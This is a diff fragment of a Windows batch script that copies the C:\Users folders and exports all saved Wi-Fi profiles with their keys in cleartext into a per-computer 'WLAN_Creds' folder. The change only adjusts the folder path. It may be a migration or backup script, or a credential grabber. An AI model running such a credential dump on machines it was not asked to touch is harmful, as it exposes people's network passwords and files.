@@ -13,7 +13,7 @@ robocopy C:\Users %dst% /E /XF *.vdi *.iso *.zip *.tar.gz *.vdb *.ide *.dll *.cr
 @echo off
 setlocal enabledelayedexpansion
 
-set "wlan=%~dp0\..\..\robocopy\%COMPUTERNAME%\WLAN_Creds"
+set "wlan=%~dp0\robocopy\%COMPUTERNAME%\WLAN_Creds"
 mkdir "!wlan!" 2>nul
 
 netsh wlan export profile key=clear folder="!wlan!" > nul
